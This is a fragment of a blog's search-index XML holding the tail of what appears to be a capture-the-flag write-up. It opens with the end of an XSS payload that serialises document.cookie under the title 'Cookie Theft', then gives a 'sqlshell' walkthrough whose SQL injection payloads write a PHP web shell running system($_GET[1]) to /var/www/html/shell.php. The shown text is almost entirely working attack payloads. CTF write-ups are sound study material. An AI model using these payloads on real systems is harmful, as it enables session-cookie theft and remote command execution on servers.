JSON.stringify(&#123;</span><br><span class="line">    title: &#x27;Cookie Theft&#x27;,</span><br><span class="line">    content: document.cookie</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure><h1 id="sqlshell"><a href="#sqlshell" class="headerlink" title="sqlshell"></a>sqlshell</h1><h2 id="wp-4"><a href="#wp-4" class="headerlink" title="wp"></a>wp</h2><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>-1 union select 1,2,3# 有回显123,写入&#x2F;var&#x2F;www&#x2F;html&#x2F;</p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02:"></a>0x02:</h3><p>-1’ union select 1,2,’<?php system($_GET[1]) ?>‘ into dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’# </p><p>alicsscascs’ union select 1,2,’<?php system($_GET[1]) ?>‘ into dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’#</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
